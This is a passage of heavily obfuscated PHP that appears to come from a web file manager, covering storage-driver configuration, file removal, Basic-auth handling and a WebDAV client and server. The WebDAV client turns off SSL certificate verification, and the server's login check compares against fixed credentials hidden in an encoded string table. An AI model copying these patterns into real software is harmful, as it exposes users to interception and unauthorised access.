$bİÖÍ¿ÅÈ[$BÕ°æø’£“[34]]) { foreach ($Bç¥ŒµÍ¥æ as $bãñõêÕ°–) { if ($bãñõêÕ°–[$BÕ°æø’£“[34]] && $bãñõêÕ°–[$BÕ°æø’£“[367]] != $dßÉÍÆåêÜ) { parent::update($bãñõêÕ°–[$BÕ°æø’£“[367]], array($BÕ°æø’£“[34] => 0)); } } } return $fçƒ¢ä¬±¯; goto F™„±Äœºƒ; F™„±Äœºƒ: } public function add($bä‚¤´…›‚) { goto e¼¬µöø¤¯; e¼¬µöø¤¯: $A¡É¶×·Î =& $_SERVER[Æ]; $aÉ´…‚à†† = array_to_keyvalue(parent::listData(), $A¡É¶×·Î[28]); if (isset($aÉ´…‚à††[$bä‚¤´…›‚[$A¡É¶×·Î[28]]])) { return !1; } goto b¼¿éáéäŸ; b„‚ø‡‚÷: return $EÙç’ò‹‡õ; goto e‰ÓÒÉÍÖ×; b¼¿éáéäŸ: $this->checkConfig($bä‚¤´…›‚); $EÙç’ò‹‡õ = parent::insert($bä‚¤´…›‚); if ($EÙç’ò‹‡õ && $bä‚¤´…›‚[$A¡É¶×·Î[34]]) { foreach ($aÉ´…‚à†† as $dŞ±ëÇ°à) { if ($dŞ±ëÇ°à[$A¡É¶×·Î[34]]) { parent::update($dŞ±ëÇ°à[$A¡É¶×·Î[367]], array($A¡É¶×·Î[34] => 0)); } } } goto b„‚ø‡‚÷; e‰ÓÒÉÍÖ×: } public function checkConfig(&$A¸ŞªÁâù˜) { goto a„ãùÕ¨Ñ¡; C†¸ñ¢÷àß: $A¸ŞªÁâù˜[$EÙšÌŞ”­Ú[6]] = json_encode($aƒ¸‰ËëÙË); $A¸ŞªÁâù˜[$EÙšÌŞ”­Ú[90]] = $D¬ÕàÖÊ¨; return !0; goto b®½ë­™¸; C®¼Ì¼ÈÄä: $aí¡½Üƒ«“ = $Aùİ‘îÖ”Á->getPath($FêŸ†ÀˆÊ¸ . $EÙšÌŞ”­Ú[1983]); if (!$Aùİ‘îÖ”Á->mkfile($aí¡½Üƒ«“)) { show_json(LNG($EÙšÌŞ”­Ú[2365]), !1); } $aƒ¸‰ËëÙË[$EÙšÌŞ”­Ú[1024]] = $FêŸ†ÀˆÊ¸; goto C†¸ñ¢÷àß; Bé”ËÖ¥óï: $AëÍç¾Ê‡ = $EÙšÌŞ”­Ú[71] . $D¬ÕàÖÊ¨; $Aùİ‘îÖ”Á = new $AëÍç¾Ê‡($aƒ¸‰ËëÙË); if (in_array($E«Ø’Ô«›–, $Aùİ‘îÖ”Á->objectDriver)) { if (!$Aùİ‘îÖ”Á->isBucketCors() && !$Aùİ‘îÖ”Á->setBucketCors()) { $d°Ä’Ù›êÎ = LNG($EÙšÌŞ”­Ú[2365]); $d°Ä’Ù›êÎ .= $EÙšÌŞ”­Ú[2366] . LNG($EÙšÌŞ”­Ú[2367]); show_json($d°Ä’Ù›êÎ, !1); } } goto C®¼Ì¼ÈÄä; b¶ğ˜×Šô: foreach ($aƒ¸‰ËëÙË as $e¦ö“ôÔÕí => $D»´µâÜ) { $aƒ¸‰ËëÙË[$e¦ö“ôÔÕí] = trim($D»´µâÜ); } $FêŸ†ÀˆÊ¸ = rtrim($aƒ¸‰ËëÙË[$EÙšÌŞ”­Ú[1024]], $EÙšÌŞ”­Ú[8]) . $EÙšÌŞ”­Ú[8]; $D¬ÕàÖÊ¨ = $this->driverType($E«Ø’Ô«›–); goto Bé”ËÖ¥óï; a„ãùÕ¨Ñ¡: $EÙšÌŞ”­Ú =& $_SERVER[Æ]; $E«Ø’Ô«›– = strtolower($A¸ŞªÁâù˜[$EÙšÌŞ”­Ú[90]]); $aƒ¸‰ËëÙË = json_decode($A¸ŞªÁâù˜[$EÙšÌŞ”­Ú[6]], !0); goto b¶ğ˜×Šô; b®½ë­™¸: } private function driverType($AŠä™†ÜÛà) { $f¶Ğå¨‚İ² =& $_SERVER[Æ]; $C›æÆÑ›î‹ = array($f¶Ğå¨‚İ²[102] => $f¶Ğå¨‚İ²[2368], $f¶Ğå¨‚İ²[58] => $f¶Ğå¨‚İ²[2369], $f¶Ğå¨‚İ²[64] => $f¶Ğå¨‚İ²[2370]); if (isset($C›æÆÑ›î‹[$AŠä™†ÜÛà])) { return $C›æÆÑ›î‹[$AŠä™†ÜÛà]; } return strtoupper($AŠä™†ÜÛà); } public function driverListSystem() { $c¸Ë·á‘Ÿš =& $_SERVER[Æ]; $FÒŞŒŞË‚œ = parent::listData(); $DïòÎò• = array(); foreach ($FÒŞŒŞË‚œ as $b°™–ÊÜˆ) { unset($b°™–ÊÜˆ[$c¸Ë·á‘Ÿš[187]], $b°™–ÊÜˆ[$c¸Ë·á‘Ÿš[107]]); $b°™–ÊÜˆ[$c¸Ë·á‘Ÿš[6]] = json_decode($b°™–ÊÜˆ[$c¸Ë·á‘Ÿš[6]], !0); $DïòÎò•[] = $b°™–ÊÜˆ; } return $DïòÎò•; } public function defaultDriver() { $b¦ÇÄöã± =& $_SERVER[Æ]; $dÎ‹„Ù¤±Ú = parent::listData(); $cøÊéÎÛå = array_filter_by_field($dÎ‹„Ù¤±Ú, $b¦ÇÄöã±[34], 1); $cøÊéÎÛå = $cøÊéÎÛå[0]; if ($cøÊéÎÛå) { $cøÊéÎÛå[$b¦ÇÄöã±[6]] = json_decode($cøÊéÎÛå[$b¦ÇÄöã±[6]], !0); } return $cøÊéÎÛå; } public function driverInfo($CÜºñ°‰œ”) { $cˆ¡•—–Ó• =& $_SERVER[Æ]; $B”…¢„òÏ² = array_to_keyvalue(parent::listData(), $cˆ¡•—–Ó•[367]); if (!isset($B”…¢„òÏ²[$CÜºñ°‰œ”])) { return !1; } $eÜğ…ÈË¯× = $B”…¢„òÏ²[$CÜºñ°‰œ”]; $eÜğ…ÈË¯×[$cˆ¡•—–Ó•[6]] = json_decode($eÜğ…ÈË¯×[$cˆ¡•—–Ó•[6]], !0); return $eÜğ…ÈË¯×; } public function remove($A÷·ç¦˜Í‘) { $this->removeShareItems($A÷·ç¦˜Í‘); return parent::remove($A÷·ç¦˜Í‘); } public function removeWithFile($a¿²‰£•ìĞ) { goto c…·äÎ††ø; c…·äÎ††ø: $F¡¤¥­ÌŸÙ =& $_SERVER[Æ]; $DÆ‚Çöµ» = array($F¡¤¥­ÌŸÙ[742] => $a¿²‰£•ìĞ); $E·ê¤Ñİö = Model($F¡¤¥­ÌŸÙ[422])->where($DÆ‚Çöµ»)->count(); goto a«¬”ËŒäå; a«¬”ËŒäå: $D”Í…„ÏŸÜ = Model($F¡¤¥­ÌŸÙ[422])->where($DÆ‚Çöµ»)->sum($F¡¤¥­ÌŸÙ[77]); $Fœ¿¨ÆåÑ = $F¡¤¥­ÌŸÙ[2371] . $a¿²‰£•ìĞ; $a×´Ü‡­ñÏ = new TaskFileTransfer($Fœ¿¨ÆåÑ, $F¡¤¥­ÌŸÙ[2372], $E·ê¤Ñİö, LNG($F¡¤¥­ÌŸÙ[2373]) . "\50{$a¿²‰£•ìĞ}\x29"); goto F¶£ŠÊæ¡; F¶£ŠÊæ¡: $a×´Ü‡­ñÏ->task[$F¡¤¥­ÌŸÙ[696]] = (double) $D”Í…„ÏŸÜ; $b£«î¥ø³¤ = KodIO::defaultDriver(); $e·ù®Ÿñß… = $b£«î¥ø³¤[$F¡¤¥­ÌŸÙ[367]]; goto AÒá°ì²–¿; d–ÀÏÆÅê: $d«ÙªÊˆÙ = Model($F¡¤¥­ÌŸÙ[167])->where($DÆ‚Çöµ»)->field($F¡¤¥­ÌŸÙ[2374])->select(); foreach ($d«ÙªÊˆÙ as $a˜¨áÕìç­) { goto a‘ÙŠ¸‚Ò; EãåÉˆ¾Ñ÷: $c…Æİ×èá = array($F¡¤¥­ÌŸÙ[742] => $e·ù®Ÿñß…, $F¡¤¥­ÌŸÙ[75] => $AÁ‹“¯æ¬½); Model($F¡¤¥­ÌŸÙ[167])->where($DÆ‚Çöµ»)->save($c…Æİ×èá); goto CÊìñ¡‡‡´; e „ÓäöÑ­: if (IO::exist($AÁ‹“¯æ¬½)) { $a×´Ü‡­ñÏ->updateFileEnd($a˜¨áÕìç­[$F¡¤¥­ÌŸÙ[28]], $a˜¨áÕìç­[$F¡¤¥­ÌŸÙ[77]]); continue; } if (!IO::move($F¯¦ÚàÃ”ù, get_path_father($AÁ‹“¯æ¬½))) { $AÓŸµòÂÏ» = !1; break; } $DÆ‚Çöµ» = array($F¡¤¥­ÌŸÙ[419] => $a˜¨áÕìç­[$F¡¤¥­ÌŸÙ[419]]); goto EãåÉˆ¾Ñ÷; a‘ÙŠ¸‚Ò: $F¯¦ÚàÃ”ù = $a˜¨áÕìç­[$F¡¤¥­ÌŸÙ[75]]; $AÁ‹“¯æ¬½ = $FñœÈÏºê . str_replace("\x7b\151\x6f\72{$a¿²‰£•ìĞ}\x7d\x2f", $F¡¤¥­ÌŸÙ[33], $F¯¦ÚàÃ”ù); if (!IO::exist($F¯¦ÚàÃ”ù)) { $CæË×¼ï¨[] = $a˜¨áÕìç­[$F¡¤¥­ÌŸÙ[419]]; $a×´Ü‡­ñÏ->updateFileEnd($a˜¨áÕìç­[$F¡¤¥­ÌŸÙ[28]], $a˜¨áÕìç­[$F¡¤¥­ÌŸÙ[77]]); continue; } goto e „ÓäöÑ­; CÊìñ¡‡‡´: } $this->removeByFileID($CæË×¼ï¨); goto eËä—ß§¹•; AÒá°ì²–¿: $FñœÈÏºê = "\173\151\x6f\x3a{$e·ù®Ÿñß…}\175\x2f"; $AÓŸµòÂÏ» = !0; $CæË×¼ï¨ = array(); goto d–ÀÏÆÅê; eËä—ß§¹•: if (!$AÓŸµòÂÏ») { $a×´Ü‡­ñÏ->stop($Fœ¿¨ÆåÑ); return !1; } $a×´Ü‡­ñÏ->end(); $this->remove($a¿²‰£•ìĞ); goto e‚ºèÀìë‡; e‚ºèÀìë‡: } public function progress($b¦»ø³©ÃÂ) { return Task::get($_SERVER[Æ][2371] . $b¦»ø³©ÃÂ); } private function removeByFileID($B˜«ãæƒç‰ = array()) { goto Aò÷‘ôÓ—; Fàºµ˜§­: foreach ($A¥êÇÆ´ØÌ as $EÊİÄµø¿Õ) { Model($cÔ‚„ù¹Ó„[382])->removeNow($EÊİÄµø¿Õ, !1); } goto eˆ¯Ù—ÉÒõ; Aò÷‘ôÓ—: $cÔ‚„ù¹Ó„ =& $_SERVER[Æ]; if (empty($B˜«ãæƒç‰)) { return; } $a¹ª˜êè¾Ä = array($cÔ‚„ù¹Ó„[419] => array($cÔ‚„ù¹Ó„[7], $B˜«ãæƒç‰)); goto eáÀÅ®¢À«; eáÀÅ®¢À«: $A¥êÇÆ´ØÌ = Model($cÔ‚„ù¹Ó„[1117])->where($a¹ª˜êè¾Ä)->field($cÔ‚„ù¹Ó„[369])->select(); if (!$A¥êÇÆ´ØÌ) { return; } $A¥êÇÆ´ØÌ = array_to_keyvalue($A¥êÇÆ´ØÌ, $cÔ‚„ù¹Ó„[33], $cÔ‚„ù¹Ó„[369]); goto Fàºµ˜§­; eˆ¯Ù—ÉÒõ: } private function removeShareItems($CÂè»Õï®) { goto aÊÔÔ­íË˜; Eù„ğ§ŞŞŞ: Model($f‰¤¿ÑôÜ²[536])->remove($Fƒ×‘‡ïŠ¯); goto cÂ¦‘Óí¶Ï; aÊÔÔ­íË˜: $f‰¤¿ÑôÜ² =& $_SERVER[Æ]; $aÌ¦»¥Òè¹ = "\173\151\x6f\72{$CÂè»Õï®}\x7d\57"; $b›·Ûåã¾ = array($f‰¤¿ÑôÜ²[369] => 0, $f‰¤¿ÑôÜ²[1018] => array($f‰¤¿ÑôÜ²[750], "{$aÌ¦»¥Òè¹}\x25")); goto däÆÁ…ÒÕ¯; däÆÁ…ÒÕ¯: $CŞ¯°£ã°Ç = Model($f‰¤¿ÑôÜ²[2078])->where($b›·Ûåã¾)->field($f‰¤¿ÑôÜ²[441])->select(); if (empty($CŞ¯°£ã°Ç)) { return; } $Fƒ×‘‡ïŠ¯ = array_to_keyvalue($CŞ¯°£ã°Ç, $f‰¤¿ÑôÜ²[33], $f‰¤¿ÑôÜ²[441]); goto Eù„ğ§ŞŞŞ; cÂ¦‘Óí¶Ï: } } goto E¢À—°„ùØ; F›µÊ´Â¾‹: define($_SERVER[Æ][227], 2); define($_SERVER[Æ][228], 3); define($_SERVER[Æ][229], 1); goto d†Åë¢èâ¸; f’É£ñ£: class HttpAuth { public static function get() { $F‘İ¢è…Şİ =& $_SERVER[Æ]; $BÇ‡½ÂÍ = $F‘İ¢è…Şİ[33]; $D¶¢ÚÙç§ª = $F‘İ¢è…Şİ[33]; if (isset($_SERVER[$F‘İ¢è…Şİ[1757]])) { $BÇ‡½ÂÍ = $_SERVER[$F‘İ¢è…Şİ[1757]]; $D¶¢ÚÙç§ª = $_SERVER[$F‘İ¢è…Şİ[1758]]; } elseif (isset($_SERVER[$F‘İ¢è…Şİ[1759]])) { $dï£¶ŒÇ¨¥ = $_SERVER[$F‘İ¢è…Şİ[1759]]; if (strpos(strtolower($dï£¶ŒÇ¨¥), $F‘İ¢è…Şİ[1760]) === 0) { $bÒ×ñ©µ› = explode($F‘İ¢è…Şİ[4], base64_decode(substr($dï£¶ŒÇ¨¥, 6))); $BÇ‡½ÂÍ = isset($bÒ×ñ©µ›[0]) ? $bÒ×ñ©µ›[0] : $F‘İ¢è…Şİ[33]; $D¶¢ÚÙç§ª = isset($bÒ×ñ©µ›[1]) ? $bÒ×ñ©µ›[1] : 0; } } return array($F‘İ¢è…Şİ[535] => $BÇ‡½ÂÍ, $F‘İ¢è…Şİ[898] => $D¶¢ÚÙç§ª); } public static function error() { goto e£“‰ ¤; fÉ‘‚Ñë‡: die; goto DŞƒ“ê°; e£“‰ ¤: $Dê¢ÎŠñ¡ =& $_SERVER[Æ]; header($Dê¢ÎŠñ¡[1761]); header($Dê¢ÎŠñ¡[1762]); goto aá•‚ï¢°Ü; aá•‚ï¢°Ü: header($Dê¢ÎŠñ¡[1763]); header($Dê¢ÎŠñ¡[1764]); header($Dê¢ÎŠñ¡[1262]); goto fÉ‘‚Ñë‡; DŞƒ“ê°: } public static function make($bŸØËæ¯›¨, $CâóñããÂé) { $d„Œ«· Š =& $_SERVER[Æ]; return $d„Œ«· Š[1765] + base64_encode($bŸØËæ¯›¨ . $d„Œ«· Š[4] . $CâóñããÂé); } } class HttpDavClient { public function __construct($B†õÈ¬’Å, $EÈ¶ï¦å¹ß, $AÁˆ ¦©éñ) { $this->header = array(); $this->userName = $EÈ¶ï¦å¹ß; $this->userPassowrd = $AÁˆ ¦©éñ; } protected function makePath($C§Œ¦Â·éÙ) { return $C§Œ¦Â·éÙ; } protected function setHeader($eğæŠ¢¹¶±, $B¡Œ–ßæŠ¶ = false) { if ($B¡Œ–ßæŠ¶ === !1) { $this->header[] = $eğæŠ¢¹¶±; } else { $this->header[] = $eğæŠ¢¹¶± . $_SERVER[Æ][881] . $B¡Œ–ßæŠ¶; } } public function move($Cñƒ¬‹Ç, $aÈìñØ¡‘Í, $B›§Éù¶‡ = '') { $F‘à³İä´ =& $_SERVER[Æ]; $this->setHeader($F‘à³İä´[1766], $this->makePath($aÈìñØ¡‘Í)); $this->setHeader($F‘à³İä´[1767], $F‘à³İä´[1768]); if ($B›§Éù¶‡) { $this->setHeader($F‘à³İä´[1769], $F‘à³İä´[926] . $B›§Éù¶‡ . $F‘à³İä´[929]); } return $this->send($F‘à³İä´[1770], $Cñƒ¬‹Ç); } public function copy($c²Ï†ø¯¬, $C£·Ë İ‹) { $fƒ´—šæö =& $_SERVER[Æ]; $this->setHeader($fƒ´—šæö[1766], $this->makePath($C£·Ë İ‹)); $this->setHeader($fƒ´—šæö[1767], $fƒ´—šæö[1768]); return $this->send($fƒ´—šæö[1771], $c²Ï†ø¯¬); } public function mkcol($F†´’ƒäÎË) { $CÇ‘¨ˆ•˜ =& $_SERVER[Æ]; $this->setHeader($CÇ‘¨ˆ•˜[1767], $CÇ‘¨ˆ•˜[1768]); return $this->send($CÇ‘¨ˆ•˜[1772], $F†´’ƒäÎË); } public function delete($AÀ¼é°Ï×÷, $F†Şõñ½è = '') { $b©¶ÏİæäÀ =& $_SERVER[Æ]; if ($F†Şõñ½è) { $this->setHeader($b©¶ÏİæäÀ[1769], $b©¶ÏİæäÀ[926] . $F†Şõñ½è . $b©¶ÏİæäÀ[929]); } return $this->send($b©¶ÏİæäÀ[1250], $AÀ¼é°Ï×÷); } public function propfind($c›‰Ï£°à÷) { $FÌô‘Ìø¼´ =& $_SERVER[Æ]; $this->setHeader($FÌô‘Ìø¼´[1773], $FÌô‘Ìø¼´[83]); $this->setHeader($FÌô‘Ìø¼´[1774], $FÌô‘Ìø¼´[1775]); $dêí¹™ƒñ = $FÌô‘Ìø¼´[1776]; return $this->send($FÌô‘Ìø¼´[1777], $c›‰Ï£°à÷, $dêí¹™ƒñ); } public function options($dàÙËÒ¬Ÿ) { return $this->send($_SERVER[Æ][1778], $dàÙËÒ¬Ÿ); } public function get($Aæåª÷°•Ì) { return $this->send($_SERVER[Æ][216], $Aæåª÷°•Ì); } public function put($C†ßÌ–†„, $d¬ŒÒœ™˜…, $b±ÎåÕˆ§Ê = '') { $dÂæÌŒ— =& $_SERVER[Æ]; if ($b±ÎåÕˆ§Ê) { $this->setHeader($dÂæÌŒ—[1769], $dÂæÌŒ—[926] . $b±ÎåÕˆ§Ê . $dÂæÌŒ—[929]); } return $this->send($dÂæÌŒ—[214], $C†ßÌ–†„, $d¬ŒÒœ™˜…); } protected function send($FŸÊ“¬¦ßá, $fí‰ Ë¶Èš, $c¥Ç§¾¬Ê = false, $f£„¬Ó·‰ = false) { goto fÆ½›ã¸Ù; fÆ½›ã¸Ù: $A†Í‚Ñ²–Æ =& $_SERVER[Æ]; $Dİ«ËùäŒè = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($A†Í‚Ñ²–Æ[1779], $A†Í‚Ñ²–Æ[50]); goto c¿í²¦ï²¢; A‰õêĞã: curl_setopt($Bé©æ†¾ô«, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($Bé©æ†¾ô«, CURLOPT_SSL_VERIFYHOST, !1); $E³Ğ µ­ÖÌ = curl_exec($Bé©æ†¾ô«); goto EÔœ¹Ãƒæ¦; c¿í²¦ï²¢: $this->setHeader($Dİ«ËùäŒè); if ($c¥Ç§¾¬Ê) { $c¥Ç§¾¬Ê = $A†Í‚Ñ²–Æ[1780] . $c¥Ç§¾¬Ê; } if (!request_url_safe($fí‰ Ë¶Èš)) { return !1; } goto AÏ²ù¼†Ø; C´¥®èÄ°: curl_setopt($Bé©æ†¾ô«, CURLOPT_HTTPHEADER, $this->header); curl_setopt($Bé©æ†¾ô«, CURLOPT_RETURNTRANSFER, !0); curl_setopt($Bé©æ†¾ô«, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto A‰õêĞã; AÏ²ù¼†Ø: $Bé©æ†¾ô« = curl_init($fí‰ Ë¶Èš); curl_setopt($Bé©æ†¾ô«, CURLOPT_CUSTOMREQUEST, $FŸÊ“¬¦ßá); curl_setopt($Bé©æ†¾ô«, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto C´¥®èÄ°; EÔœ¹Ãƒæ¦: $this->header = array(); return $E³Ğ µ­ÖÌ; goto BÄñª·ƒ‘õ; BÄñª·ƒ‘õ: } } class HttpDavServer { public function __construct($d×ÎŠğÁáÍ, $a–›Œ¢³à—) { $this->root = $d×ÎŠğÁáÍ; $this->initPath($a–›Œ¢³à—); $this->start(); } public function initPath($FºêÓÃ„Šõ) { $D“Ò²Ÿ‹êø =& $_SERVER[Æ]; $Cùøƒ‡Ì÷« = rtrim($_SERVER[$D“Ò²Ÿ‹êø[1385]], $D“Ò²Ÿ‹êø[8]) . $D“Ò²Ÿ‹êø[8]; $this->urlBase = substr($Cùøƒ‡Ì÷«, 0, strpos($Cùøƒ‡Ì÷«, $FºêÓÃ„Šõ) + 1); $this->urlBase = rtrim($this->urlBase, $D“Ò²Ÿ‹êø[8]) . $FºêÓÃ„Šõ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $aÄõ¥åÖŸÄ =& $_SERVER[Æ]; $b™‘ø²ç‹ = HttpAuth::get(); if ($b™‘ø²ç‹[$aÄõ¥åÖŸÄ[535]] == $aÄõ¥åÖŸÄ[1781] && $b™‘ø²ç‹[$aÄõ¥åÖŸÄ[898]] == $aÄõ¥åÖŸÄ[1782]) { return !0; } HttpAuth::error(); } public function start() { goto A¦Ç¸•ËÈì; A¦Ç¸•ËÈì: $Aƒ·Ïßæ¾ç =& $_SERVER[Æ]; $this->checkUser(); $e«âÊùÏì¨ = $Aƒ·Ïßæ¾ç[144] . HttpHeader::method(); goto cºËŠÃÅÜ; eÌøƒù™Œ: if (!$Dˆ‰ÈÍµ´) { return; } self::response($Dˆ‰ÈÍµ´); goto e¤¯Õç„¢; cºËŠÃÅÜ: if (!method_exists($this, $e«âÊùÏì¨)) { pr($e«âÊùÏì¨ . $Aƒ·Ïßæ¾ç[1783]); die; } $câˆ‡´º®Ñ = array($Aƒ·Ïßæ¾ç[1784], $Aƒ·Ïßæ¾ç[1785]); if (!in_array($e«âÊùÏì¨, $câˆ‡´º®Ñ) && !$this->pathExists($this->path)) { $Dˆ‰ÈÍµ´ = array($Aƒ·Ïßæ¾ç[1032] => 404); } else { $Dˆ‰ÈÍµ´ = $this->{$e«âÊùÏì¨}(); } goto eÌøƒù™Œ; e¤¯Õç„¢: } public function pathGet($d½ØêÈ‘ó˜ = false) { $b‹—ï÷êá¾ =& $_SERVER[Æ]; $B›£ä·³¿ = $d½ØêÈ‘ó˜ ? $_SERVER[$b‹—ï÷êá¾[1786]] : $_SERVER[$b‹—ï÷êá¾[1385]]; $B›£ä·³¿ = KodIO::clear(rawurldecode($B›£ä·³¿)); if (!strstr($B›£ä·³¿, KodIO::clear($this->urlBase))) { return !1; } return substr($B›£ä·³¿, strpos($B›£ä·³¿, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($C”’†§Å) { return file_exists($C”’†§Å); } public function pathMkdir($bó™ÓÆÎÜ«) { return mkdir($bó™ÓÆÎÜ«, 511, !0); } public function pathInfo($F´‹Á‡ìïÓ) { return path_info($F´‹Á‡ìïÓ); } public function pathList($cæ¢§ˆ«Ğ) { return path_list($cæ¢§ˆ«Ğ); } public function pathOut($A˜ÓˆÊĞ‡) { echo file_get_contents($A˜ÓˆÊĞ‡); } public function pathPut($DÖå±‚È½, $CŒàåÅØ•Ä = '') { if (!$CŒàåÅØ•Ä) { return file_put_contents($DÖå±‚È½, $_SERVER[Æ][33]); } return move_path($CŒàåÅØ•Ä, $DÖå±‚È½); } public function pathRemove($aõÌé¸è’Ç) { if (is_file($aõÌé¸è’Ç)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($a‘ÃÔ§©¯Ì, $CµšÊ¬æ‘ó) { return move_path($a‘ÃÔ§©¯Ì, $CµšÊ¬æ‘ó); } public function pathCopy($bòŠÍ¬’„§, $c…øÕ¡í«È) { return copy_dir($bòŠÍ¬’„§, $c…øÕ¡í«È); } public function parsePath($b†¦™¾ÖÇˆ) { return $b†¦™¾ÖÇˆ; } public function parseItem($Eƒğà…Êˆğ, $D…ê„©¿ã) { goto cæå¦— Ó£; CŠ• ÇÖÑé: $EŒ´†‹íµÅ = array($C­¡¦éŒê®[1787] => KodIO::clear($this->urlBase . $Fì‹µ¬Ãİì), $C­¡¦éŒê®[107] => @gmdate($C­¡¦éŒê®[1788], $Eƒğà…Êˆğ[$C­¡¦éŒê®[107]]), $C­¡¦éŒê®[187] => @gmdate($C­¡¦éŒê®[1789], $Eƒğà…Êˆğ[$C­¡¦éŒê®[187]]), $C­¡¦éŒê®[77] => $Eƒğà…Êˆğ[$C­¡¦éŒê®[77]] ? $Eƒğà…Êˆğ[$C­¡¦éŒê®[77]] : 0); return $EŒ´†‹íµÅ; goto CÛØÀªáÙ; FëæîÂèŞ: if ($D…ê„©¿ã) { $Fì‹µ¬Ãİì = $C­¡¦éŒê®[8] . str_replace($C­¡¦éŒê®[172], $C­¡¦éŒê®[8], rawurlencode($this->pathGet())); } if (!trim($Eƒğà…Êˆğ[$C­¡¦éŒê®[107]])) { $Eƒğà…Êˆğ[$C­¡¦éŒê®[107]] = time(); } if (!trim($Eƒğà…Êˆğ[$C­¡¦éŒê®[187]])) { $Eƒğà…Êˆğ[$C­¡¦éŒê®[187]] = time(); } goto CŠ• ÇÖÑé; cæå¦— Ó£: $C­¡¦éŒê® =& $_SERVER[Æ]; $Fì‹µ¬Ãİì = $this->pathGet() . $C­¡¦éŒê®[8] . $Eƒğà…Êˆğ[$C­¡¦éŒê®[28]]; $Fì‹µ¬Ãİì = $C­¡¦éŒê®[8] . str_replace($C­¡¦éŒê®[172], $C­¡¦éŒê®[8], rawurlencode($Fì‹µ¬Ãİì)); goto FëæîÂèŞ; CÛØÀªáÙ: } public function parseItemXml($cƒ‰»Š‚, $Fó÷äé‹„š) { $bã§îŒœ =& $_SERVER[Æ]; $aã±£­†Ã¥ = $this->parseItem($cƒ‰»Š‚, $Fó÷äé‹„š); if ($cƒ‰»Š‚[$bã§îŒœ[29]] == $bã§îŒœ[76]) { $B–±ïÄå¹î = $bã§îŒœ[1790]; $B–±ïÄå¹î .= $bã§îŒœ[1791]; } else { $E´â‹ºÉÕ = $cƒ‰»Š‚[$bã§îŒœ[160]] ? $cƒ‰»Š‚[$bã§îŒœ[160]] : get_path_ext($cƒ‰»Š‚[$bã§îŒœ[28]]); $bÁ§‰ê‘ï = get_file_mime($E´â‹ºÉÕ); $B–±ïÄå¹î = $bã§îŒœ[1792]; $B–±ïÄå¹î .= "\74\104\72\x67\145\164\x63\157\x6e\164\145\156\x74\164\x79\x70\145\x3e{$bÁ§‰ê‘ï}\74\57\x44\x3a\x67\145\164\143\157\156\x74\145\x6e\164\x74\171\160\x65\x3e"; } return "\xa\x9\11\74\104\x3a\162\145\x73\x70\157\x6e\163\x65\76\12\11\x9\11\74\x44\72\150\x72\x65\x66\76{$aã±£­†Ã¥[$bã§îŒœ[1787]]}\74\x2f\104\72\x68\162\x65\146\76\xa\11\x9\11\x3c\104\72\160\162\x6f\160\x73\164\x61\164\76\xa\11\x9\x9\11\74\104\x3a\160\162\157\x70\76\12\11\11\x9\11\11\74\x44\x3a\147\145\x74\154\141\x73\164\155\x6f\x64\x69\x66\151\x65\x64\76{$aã±£­†Ã¥[$bã§îŒœ[107]]}\74\x2f\104\72\147\x65\x74\154\x61\x73\164\x6d\x6f\x64\151\x66\151\145\x64\x3e\12\x9\x9\x9\11\11\x3c\104\72\143\162\145\x61\164\151\x6f\156\144\141\164\x65\x3e{$aã±£­†Ã¥[$bã§îŒœ[187]]}\x3c\57\x44\72\x63\x72\145\x61\164\151\x6f\156\144\x61\164\x65\x3e\xa\11\11\x9\x9\x9\74\104\72\147\145\x74\x63\x6f\x6e\x74\x65\x6e\164\x6c\145\x6e\x67\164\150\x3e{$aã±£­†Ã¥[$bã§îŒœ[77]]}\74\x2f\104\72\147\145\164\143\x6f\156\x74\x65\x6e\x74\154\145\x6e\147\x74\x68\76\12\x9\11\x9\11\x9{$B–±ïÄå¹î}\12\x9\11\11\11\74\x2f\104\72\x70\x72\157\x70\x3e\xa\11\x9\x9\11\x3c\x44\x3a\x73\x74\x61\164\165\x73\76\110\124\124\120\57\x31\x2e\x31\x20\x32\60\60\40\117\113\74\57\x44\72\163\x74\x61\164\x75\x73\76\xa\11\x9\11\74\x2f\x44\72\x70\x72\x6f\x70\163\x74\141\x74\76\xa\x9\x9\x3c\57\104\72\162\x65\163\x70\x6f\156\163\x65\76"; } public function pathListMerge($A“‹Æ•¨ê) { goto B®”ÊĞ›”ë; B®”ÊĞ›”ë: $CÆ™™ƒø =& $_SERVER[Æ]; if (!$A“‹Æ•¨ê) { return $A“‹Æ•¨ê; } $DÛ®Ö ×õ = array($CÆ™™ƒø[73], $CÆ™™ƒø[74], $CÆ™™ƒø[1793]); goto eãâ–¼íŒØ; eí»ºÛ®•: return $AÍå±°éô; goto FÓîÜ²‚©ƒ; eãâ–¼íŒØ: $AÍå±°éô = array(); foreach ($A“‹Æ•¨ê as $c©²×š† => $c…ÍßÁÚ•í) { if (!in_array($c©²×š†, $DÛ®Ö ×õ) || !is_array($c…ÍßÁÚ•í)) { continue; } $AÍå±°éô = array_merge($AÍå±°éô, $c…ÍßÁÚ•í); } foreach ($AÍå±°éô as &$cŞˆÔÆÆ±Ê) { $cŞˆÔÆÆ±Ê[$CÆ™™ƒø[28]] = str_replace($CÆ™™ƒø[8], $CÆ™™ƒø[1387], $cŞˆÔÆÆ±Ê[$CÆ™™ƒø[28]]); } goto eí»ºÛ®•; FÓîÜ²‚©ƒ: } public function httpPROPFIND() { goto C–÷íÛŠªÛ; C–÷íÛŠªÛ: $aµŞß¤îã =& $_SERVER[Æ]; $f³º–ÔÂ‰± = $this->pathList($this->path); $Aœ†î¡Íî¡ = $this->pathListMerge($f³º–ÔÂ‰±); goto aå‹âÕ„ğØ; aå‹âÕ„ğØ: $bó¥õ“çèñ = $f³º–ÔÂ‰±[$aµŞß¤îã[1794]]; if (!is_array($Aœ†î¡Íî¡) || $bó¥õ“çèñ[$aµŞß¤îã[1795]] === !1) { return array($aµŞß¤îã[1796] => 404, $aµŞß¤îã[1797] => $aµŞß¤îã[1798]); } $eÉäÎ¥éøñ = $bó¥õ“çèñ[$aµŞß¤îã[29]] == $aµŞß¤îã[167] || HttpHeader::get($aµŞß¤îã[1773]) == $aµŞß¤îã[468]; goto CÁÓ‚¶’Â¹; CÁÓ‚¶’Â¹: if ($eÉäÎ¥éøñ) { 